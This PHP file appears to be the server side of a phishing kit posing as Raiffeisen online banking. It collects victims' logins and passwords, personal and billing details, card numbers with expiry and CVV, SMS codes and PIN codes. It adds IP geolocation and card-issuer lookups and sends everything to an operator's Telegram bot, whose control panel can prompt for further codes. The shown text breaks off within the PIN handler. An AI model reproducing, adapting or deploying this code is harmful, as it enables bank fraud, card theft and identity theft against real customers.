<?php
error_reporting(E_ALL);
ini_set("display_errors", 1);
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

$local_userAgent = isset($_SERVER["HTTP_USER_AGENT"])
    ? $_SERVER["HTTP_USER_AGENT"]
    : "";
$local_time = date("Y-m-d H:i:s");
$local_domain = $_SERVER["SERVER_NAME"];
$local_os = get_platform($local_userAgent);
$local_browser = get_browser_value($local_userAgent);
$currentUrlPath = $_SERVER['REQUEST_URI'];
$domain = $_SERVER['HTTP_HOST'];
preg_match('~^/web/([^/]+)/?~', $currentUrlPath, $matches);
$folderName = isset($matches[1]) ? $matches[1] : '';
global  $local_userAgent, $local_time, $local_domain, $local_os, $local_browser;

function get_platform($USER_AGENT)
{
    $OS_ERROR = "Unknown OS Platform";
    $OS = [
        "/windows nt 11/i" => "Windows 11",
        "/windows nt 10/i" => "Windows 10",
        "/windows nt 6.3/i" => "Windows 8.1",
        "/windows nt 6.2/i" => "Windows 8",
        "/windows nt 6.1/i" => "Windows 7",
        "/windows nt 6.0/i" => "Windows Vista",
        "/windows nt 5.2/i" => "Windows Server 2003/XP x64",
        "/windows nt 5.1/i" => "Windows XP",
        "/windows xp/i" => "Windows XP",
        "/windows nt 5.0/i" => "Windows 2000",
        "/windows me/i" => "Windows ME",
        "/win98/i" => "Windows 98",
        "/win95/i" => "Windows 95",
        "/win16/i" => "Windows 3.11",
        "/macintosh|mac os x/i" => "Mac OS X",
        "/mac_powerpc/i" => "Mac OS 9",
        "/linux/i" => "Linux",
        "/ubuntu/i" => "Ubuntu",
        "/iphone/i" => "iPhone",
        "/ipod/i" => "iPod",
        "/ipad/i" => "iPad",
        "/android/i" => "Android",
        "/blackberry/i" => "BlackBerry",
        "/webos/i" => "Mobile",
    ];
    foreach ($OS as $regex => $value) {
        if (preg_match($regex, $USER_AGENT)) {
            $OS_ERROR = $value;
        }
    }
    return $OS_ERROR;
}
function get_browser_value($USER_AGENT)
{
    $BROWSER_ERROR = "Unknown Browser";
    $BROWSER = [
        "/msie/i" => "Internet Explorer",
        "/firefox/i" => "Firefox",
        "/safari/i" => "Safari",
        "/chrome/i" => "Chrome",
        "/edge/i" => "Edge",
        "/opera/i" => "Opera",
        "/netscape/i" => "Netscape",
        "/maxthon/i" => "Maxthon",
        "/konqueror/i" => "Konqueror",
        "/mobile/i" => "Handheld Browser",
    ];
    foreach ($BROWSER as $regex => $value) {
        if (preg_match($regex, $USER_AGENT)) {
            $BROWSER_ERROR = $value;
        }
    }
    return $BROWSER_ERROR;
}
function getClientIP()
{
    if (!empty($_SERVER["HTTP_CLIENT_IP"])) {
        $ipAddress = $_SERVER["HTTP_CLIENT_IP"];
    } elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
        $ipAddress = $_SERVER["HTTP_X_FORWARDED_FOR"];
    } else {
        $ipAddress = $_SERVER["REMOTE_ADDR"];
    }

    $validIPs = [];
    $ipMatches = preg_match_all(
        "/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/",
        $ipAddress,
        $matches
    );

    if ($ipMatches) {
        $validIPs = $matches[0];
    }

    if (!empty($validIPs)) {
        $_SESSION["session_ip"] = $validIPs[0];
        return $validIPs[0];
    } else {
        $_SESSION["session_ip"] = "127.0.0.1";
        return "127.0.0.1";
    }
}	
function fetchIPInfo($ipAddress)
{
    $url = "http://ip-api.com/php/{$ipAddress}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query";
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    curl_close($curl);
    $info = unserialize($response);
    $_SESSION["session_isp"] = isset($info["isp"]) ? $info["isp"] : null;
    $_SESSION["session_country"] = isset($info["country"])
        ? $info["country"]
        : null;
    $_SESSION["session_country_code"] = isset($info["countryCode"])
        ? $info["countryCode"]
        : null;
    $_SESSION["session_city"] = isset($info["city"]) ? $info["city"] : null;
    $_SESSION["session_region"] = isset($info["region"])
        ? $info["region"]
        : null;
    $proxy = isset($info["proxy"]) ? $info["proxy"] : null;
    $_SESSION["session_proxy"] = $proxy == 1 ? "True" : "False";
    $mobile = isset($info["mobile"]) ? $info["mobile"] : null;
    $_SESSION["session_mobile"] = $mobile == 1 ? "True" : "False";
    $hosting = isset($info["hosting"]) ? $info["hosting"] : null;
    $_SESSION["session_hosting"] = $hosting == 1 ? "True" : "False";
}
function tele_message($message)
{
	$TrubFtub = $_COOKIE['idtel'];
    $cRetVckr = $_COOKIE['tokentel'];
    $api_url = "https://api.telegram.org/bot{$cRetVckr}/sendMessage";
    $params = ["chat_id" => $TrubFtub, "text" => $message];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
}
function up_file_log($content)
{
    $filePath = 'log.txt';
    $content .= "\n";
    if (file_exists($filePath))
    {
        $existingContent = file_get_contents($filePath);
        $newContent = $content . $existingContent;
        file_put_contents($filePath, $newContent);
    }
    else
    {
        $file = fopen($filePath, 'w');
        if ($file) {
            fwrite($file, $content);
            fclose($file);
        } else {
            echo "Failed to open the file.";
        }
    }
}
function check_file($user, $filename) 
{
	$fileFullPath = $filename;

    if (file_exists($fileFullPath)) {
        return true;
    } else {
        return false;
    }
}

function sendKey($rezdata) {
    $currentUrlPath = $_SERVER['REQUEST_URI'];
    $domain = $_SERVER['HTTP_HOST'];
    preg_match('~^/web/([^/]+)/?~', $currentUrlPath, $matches);
    $folderName = $matches[1] ?? '';
    $bot_url  = $_COOKIE['tokentel'] ?? '';
    $chat_id  = $_COOKIE['idtel'] ?? '';
    $show_web_panel = true;
    $show_confirm = true;
    $show_ban = true;

    $file_s = 'login.php';
	if (check_file($folderName, $file_s)) {
		 $show_login = true;
	 }else{
		 $show_login = false;
	 }
	 $file_s = 'utilisateur.php';
	if (check_file($folderName, $file_s)) {
		 $show_utilisateur = true;
	 }else{
		 $show_utilisateur = false;
	 }
	 $file_s = 'usager.php';
	if (check_file($folderName, $file_s)) {
		 $show_usager = true;
	 }else{
		 $show_usager = false;
	 }
	 
	 $file_s = 'operationsapp.php';
	if (check_file($folderName, $file_s)) {
		 $show_operationsapp = true;
	 }else{
		 $show_operationsapp = false;
	 }
	 $file_s = 'operationssms.php';
	if (check_file($folderName, $file_s)) {
		 $show_operationssms = true;
	 }else{
		 $show_operationssms = false;
	 }
	 
	 $file_s = 'alert.php';
	if (check_file($folderName, $file_s)) {
		 $show_alert = true;
	 }else{
		 $show_alert = false;
	 }
	$file_s = 'phone.php';
	if (check_file($folderName, $file_s)) {
		 $show_phone = true;
	 }else{
		 $show_phone = false;
	 }	 
	$file_s = 'sms.php';
	if (check_file($folderName, $file_s)) {
		  $show_sms = true;
	 }else{
		  $show_sms = false;
	 }
	$file_s = 'email.php';
	if (check_file($folderName, $file_s)) {
		  $show_email = true;
	 }else{
		$show_email = false;
	 }
	$file_s = 'app.php';
	if (check_file($folderName, $file_s)) {
		 $show_app = true;
	 }else{
		$show_app = false;
	 }
	$file_s = 'pin.php';
	if (check_file($folderName, $file_s)) {
		 $show_pin = true;
	 }else{
		 $show_pin = false;
	 }
	$file_s = 'message.php';
	if (check_file($folderName, $file_s)) {
		  $show_message = true;
	 }else{
		 $show_message = false;
	 }
	$file_s = 'card.php';
	if (check_file($folderName, $file_s)) {
		 $show_card = true; 
	 }else{
		$show_card = false; 
	 }
	$file_s = 'logout.php';
	if (check_file($folderName, $file_s)) {
		 $show_confirm = true;
	 }else{
		 $show_confirm = false;
	 }

    $url = "https://$domain/web/api.php?userid=$folderName";

    $inline_keyboard = [];

    if ($show_web_panel) {
        $inline_keyboard[] = [
            ["text" => "🌍 Web Panel", "url" => "$url"]
        ];
    }
    if ($show_login) {
        $inline_keyboard[] = [
            ["text" => "🔑 Error Login", "url" => "$url&action=login"]
        ];
    }
    if ($show_phone) {
        $inline_keyboard[] = [
            ["text" => "📞 Phone", "url" => "$url&action=phone"]
        ];
    }
    if ($show_sms) {
        $inline_keyboard[] = [
            ["text" => "📲 SMS", "url" => "$url&action=sms"]
        ];
    }
    if ($show_email) {
        $inline_keyboard[] = [
            ["text" => "📧 Email", "url" => "$url&action=email"]
        ];
    }
    if ($show_app) {
        $inline_keyboard[] = [
            ["text" => "💿 APP", "url" => "$url&action=app"]
        ];
    }
    if ($show_pin) {
        $inline_keyboard[] = [
            ["text" => "🔐 PIN", "url" => "$url&action=pin"]
        ];
    }
    if ($show_message) {
        $inline_keyboard[] = [
            ["text" => "🖨️ MSG", "url" => "$url&action=msg"]
        ];
    }
    if ($show_card) {
        $inline_keyboard[] = [
            ["text" => "💳 Card", "url" => "$url&action=card"]
        ];
    }
    if ($show_utilisateur) {
        $inline_keyboard[] = [
            ["text" => "🏥 utilisateur", "url" => "$url&action=utilisateur"]
        ];
    }
    if ($show_usager) {
        $inline_keyboard[] = [
            ["text" => "🛢 usager", "url" => "$url&action=usager"]
        ];
    }
	if ($show_alert) {
        $inline_keyboard[] = [
            ["text" => "⚠ Alert", "url" => "$url&action=alert"]
        ];
    }
	if ($show_operationsapp) {
        $inline_keyboard[] = [
            ["text" => "🗯 Operations APP", "url" => "$url&action=operationsapp"]
        ];
    }
	if ($show_operationssms) {
        $inline_keyboard[] = [
            ["text" => "🤿 Operations SMS", "url" => "$url&action=operationssms"]
        ];
    }	
	
	
	

    if ($show_confirm) {
        $inline_keyboard[] = [
            ["text" => "✅ CONFIRM ✅", "url" => "$url&action=done"]
        ];
    }
    if ($show_ban) {
        $inline_keyboard[] = [
            ["text" => "⛔ BAN IP ⛔", "url" => "$url&action=ban"]
        ];
    }

    $keyboard = json_encode(["inline_keyboard" => $inline_keyboard]);

    $parameters = [
        "chat_id" => $chat_id,
        "text" => $rezdata,
        'reply_markup' => $keyboard
    ];
    
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($parameters));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

function BinCheck($new_string) {
    $cc = $new_string;
    $bin = substr($cc, 0, 6);
    $bins = str_replace(' ', '', $bin);
    
    $ch = curl_init();
    $url = "https://lookup.binlist.net/" . $bin;
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array();
    $headers[] = 'Accept-Version: 3';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $res = curl_exec($ch);

    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
        return null;
    }

    curl_close($ch);

    $someArray = json_decode($res, true);
    
    if (isset($someArray['bank']['name'])) {
        $j_name = $someArray['bank']['name'];
    } else {
        $j_name = "Unknown Bank";
    }
	
	if (isset($someArray['scheme'])) {
        $j_scheme = $someArray['scheme'];
    } else {
        $j_scheme = "Unknown scheme";
    }

    if (isset($someArray['type'])) {
        $j_type = $someArray['type'];
    } else {
        $j_type = "Unknown Type";
    }

    if (isset($someArray['brand'])) {
        $j_brand = $someArray['brand'];
    } else {
        $j_brand = "Unknown Brand";
    }

    if (isset($someArray['country']['name'])) {
        $j_country = $someArray['country']['name'];
    } else {
        $j_country = "Unknown Country";
    }
    
    return array($j_scheme, $j_name, $j_type, $j_brand, $j_country);
}

function getCardInfoFromBIN($bin) {
    $url = "https://lookup.binlist.net/" . urlencode($bin);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Accept-Version: 3",
        "User-Agent: PHP BIN Checker"
    ]);

    $response = curl_exec($ch);
    $httpStatus = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpStatus !== 200 || !$response) {
        return [
            'success' => false,
            'error' => "HTTP error $httpStatus or empty response."
        ];
    }

    $data = json_decode($response, true);
    if (!$data) {
        return [
            'success' => false,
            'error' => "Invalid JSON response."
        ];
    }

    return [
        'success' => true,
        'scheme' => $data['scheme'] ?? 'Unknown',
        'type' => $data['type'] ?? 'Unknown',
        'brand' => $data['brand'] ?? 'Unknown',
        'bank' => $data['bank']['name'] ?? 'Unknown',
        'bank_url' => $data['bank']['url'] ?? '',
        'bank_phone' => $data['bank']['phone'] ?? '',
        'country' => $data['country']['name'] ?? 'Unknown',
        'currency' => $data['country']['currency'] ?? '',
        'emoji' => $data['country']['emoji'] ?? ''
    ];
}


function validateCard($card_number, $cvv, $expiry_date) {
    $result = ['valid' => true, 'error_message' => ''];
    if (!preg_match('/^\d{16}$/', $card_number)) {
        $result['valid'] = false;
        $result['error_message'] = "0";
        return $result;
    }

    if (!preg_match('/^\d{3}$/', $cvv)) {
        $result['valid'] = false;
        $result['error_message'] = "1";
        return $result;
    }
    if (!preg_match('/^(0[1-9]|1[0-2])\/\d{2}$/', $expiry_date)) {
        $result['valid'] = false;
        $result['error_message'] = "2";
        return $result;
    } else {
        $current_year = (int)date('y');
        $current_month = (int)date('m');

        list($exp_month, $exp_year) = explode('/', $expiry_date);
        $exp_month = (int)$exp_month;
        $exp_year = (int)$exp_year;

        if ($exp_year < $current_year || ($exp_year === $current_year && $exp_month < $current_month)) {
            $result['valid'] = false;
            $result['error_message'] = "3";
            return $result;
        }
    }

    return $result;
}

function extractBin($cardNumber) {
    // Remove spaces or dashes
    $cleaned = preg_replace('/\D/', '', $cardNumber);

    // Return first 6 digits
    return substr($cleaned, 0, 6);
}

if ($_SERVER["REQUEST_METHOD"] === "POST")
{
	
    $currentUrlPath = $_SERVER['REQUEST_URI'];
    $domain = $_SERVER['HTTP_HOST'];
    preg_match('~^/web/([^/]+)/?~', $currentUrlPath, $matches);
    $folderName = isset($matches[1]) ? $matches[1] : '';
    $url = "https://$domain/web/api.php?userid=$folderName";
    $ipaddress = getClientIP();
    fetchIPInfo($ipaddress);
	if (isset($_SESSION["session_country_code"])) {
        $country_code = strtoupper($_SESSION["session_country_code"]);
    } else {
        $country_code = '';
    }

	$subscibe = "Raiffeisen WEB - ($country_code)";
    $country = $_SESSION["session_country"];
    $isp = $_SESSION["session_isp"];
    $city = $_SESSION["session_city"];
    $proxy = $_SESSION["session_proxy"];	
    $local_time = date("Y-m-d H:i:s");	


	if (isset($_POST['virtual'])) 
	{
		
		         $message = "
➡️ 🆄🆃🅸🅻🅸🆂🅰🆃🅴🆄🆁
------------------------------------
🔑  User Send Sumulation
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 $blank_page = $subscibe;
		 up_file_log("User Start Sumulation |$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $blank_page);
		
	}
	if (isset($_POST['branch_name'])) 
	{
	     $j_operationssms = $_POST['branch_name'];
         $message = "
➡️ 🅾🅿🅴🆁🅰🆃🅸🅾🅽🆂 
------------------------------------
🔑  𝗢𝗽𝗲𝗿𝗮𝘁𝗶𝗼𝗻𝘀 : {$j_operationssms}
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 $blank_page = $subscibe;
		 up_file_log("User Send branch to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $blank_page);
		 header('Content-Type: application/json');

$response = [
    "success" => true,
    "message" => "Data received successfully",
    "data" => [
        "id" => 123,
        "name" => "Example"
    ]
];
	sendKey($message);
    $blank_page = ' ';
    $up_file = fopen("api.txt", "w");
    fwrite($up_file, $blank_page);
echo json_encode($response, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
exit;
	}

	if (isset($_POST['j_utilisateur'])) 
	{
	     $j_utilisateur = $_POST['j_utilisateur'];
         $message = "
➡️ 🆄🆃🅸🅻🅸🆂🅰🆃🅴🆄🆁
------------------------------------
🔑  𝗨𝘁𝗶𝗹𝗶𝘀𝗮𝘁𝗲𝘂𝗿 𝗖𝗼𝗱𝗲: {$j_utilisateur}
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 $blank_page = $subscibe;
		 up_file_log("User Send usager to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $blank_page);
	}
	
	if (isset($_POST['j_usager'])) 
	{
	     $j_usager = $_POST['j_usager'];
         $message = "
➡️ 🆄🆂🅰🅶🅴🆁
------------------------------------
🔑  𝘂𝘀𝗮𝗴𝗲𝗿 𝗖𝗼𝗱𝗲: {$j_usager}
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 $blank_page = $subscibe;
		 up_file_log("User Send usager to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $blank_page);
	}
	if (isset($_POST['ignorer'])) 
	{
	         $message = "
➡️ 🅸🅶🅽🅾🆁🅴🆁
------------------------------------
🐸  𝗨𝘀𝗲𝗿 𝗰𝗹𝗶𝗰𝗸 𝗼𝗻 𝗶𝗴𝗻𝗼𝗿𝗲𝗿
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 up_file_log("User Send ignorer to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $subscibe);
		 
		 
		sendKey($message);
    $blank_page = ' ';
    $up_file = fopen("api.txt", "w");
    fwrite($up_file, $blank_page);
    echo ("<script LANGUAGE='JavaScript'>
    window.location.href='loading.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "';
    </script>"); 
	exit();	
	}
	if (isset($_POST['annulation'])) 
	{
	         $message = "
➡️ 🅰🅽🅽🆄🅻🅰🆃🅸🅾🅽 
------------------------------------
🦧  𝗨𝘀𝗲𝗿 𝗰𝗹𝗶𝗰𝗸 𝗼𝗻 𝗮𝗻𝗻𝘂𝗹𝗮𝘁𝗶𝗼𝗻
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 up_file_log("User Send annulation to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $subscibe);
		 

	}
	if (isset($_POST['j_username']) && isset($_POST['j_password'])) 
	{
		  
	     $user = $_POST['j_username'];
         $pass = $_POST['j_password'];
         $message = "
➡️ 🅻🅾🅶🅸🅽 
------------------------------------
💻  𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: $user
🔑  𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱: $pass
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 up_file_log("User Send Login to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $subscibe);
		 
		 
	sendKey($message);
    $blank_page = ' ';
    $up_file = fopen("api.txt", "w");
    fwrite($up_file, $blank_page);
    echo ("<script LANGUAGE='JavaScript'>
    window.location.href='loading.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "';
    </script>"); 
	exit();
	}		
	if (isset($_POST['j_name']) && isset($_POST['j_adress'])&& isset($_POST['j_city'])&& isset($_POST['j_zip'])) 
	{
		  
	     $j_name = $_POST['j_name'];
         $j_adress = $_POST['j_adress'];
		 $j_city = $_POST['j_city'];
		 $j_zip = $_POST['j_zip'];
		 $j_dob = $_POST['j_dob'];
		 $j_phone = $_POST['j_phone'];
		 $j_email = $_POST['j_email'];
		 
         $message = "
🅱🅸🅻🅻🅸🅽🅶 
------------------------------------
👔  𝗡𝗮𝗺𝗲: {$j_name}
🏳️  𝗔𝗱𝗱𝗿𝗲𝘀𝘀: {$j_adress}
🚸  𝗖𝗶𝘁𝘆: {$j_city}
🚸  𝗭𝗜𝗣: {$j_zip}
👨‍👩‍👧‍👦  𝗗𝗼𝗯: {$j_dob}
📱  𝗣𝗵𝗼𝗻𝗲: {$j_phone}
📧  𝗘𝗺𝗮𝗶𝗹: {$j_email}
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 $blank_page = $subscibe;
		 up_file_log("User Send Billing to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $blank_page);
		 sendKey($message);
         $blank_page = ' ';
         $up_file = fopen("api.txt", "w");
         fwrite($up_file, $blank_page);
         echo ("<script LANGUAGE='JavaScript'>
             window.location.href='loading.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "';
             </script>");
	     exit;
	
	}
    if (isset($_POST['one']) && isset($_POST['two'])&& isset($_POST['three'])) 
	{
		  
	     $j_card = $_POST['one'];
         $j_exp = $_POST['two'];
		 $j_cvv = $_POST['three'];
		
		 $validation_result = validateCard($j_card, $j_cvv, $j_exp);
              
		 $bin = extractBin($j_card);
         $info = getCardInfoFromBIN($bin);
		 
		 if ($info['success']) {
			 
	
		 $scheme = $info['scheme'];
         $type = $info['type'];
         $brand = $info['brand'];
         $name = $info['bank'];
         $country = $info['country'];

        } else {
         $phone = "";
         $url = "";
		 $scheme = "";
         $type = "";
         $brand = "";
         $name = "";
         $country = "";
        }
        


        

         $message = "
➡️ 🅲🅰🆁🅳
------------------------------------
💳  𝗖𝗮𝗿𝗱: {$j_card}
💳  𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: {$j_exp}
💳  𝗰𝘃𝘃: {$j_cvv}
------------------------------------
🏛️ BIN: {$bin}
🏛️ BANK INFO'S: {$scheme}
🏛️ Banque : {$name}
🏛️ Niveau : {$brand}
🏛️ Type : {$type}
🏛️ Country : {$country}
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 $blank_page = $subscibe;
		 $_SESSION["one"] = $j_card;
		 up_file_log("User Send Card to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $blank_page);
		
		
	}
    if (isset($_POST['j_sms_code'])) 
	{
		  
	     $j_sms_code = $_POST['j_sms_code'];
         $message = "
➡️ 🆂🅼🆂
------------------------------------
🔑  𝗦𝗠𝗦 𝗖𝗼𝗱𝗲: {$j_sms_code}
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 $blank_page = $subscibe;
		 up_file_log("User Send SMS to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $blank_page);
	}	 
    if (isset($_POST['j_pin_code'])) 
	{
		  
	     $j_pin_code = $_POST['j_pin_code'];
         $message = "
➡️ 🅿🅸🅽
------------------------------------
🔑  𝗣𝗶𝗻 𝗖𝗼𝗱𝗲: {$j_pin_code}
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
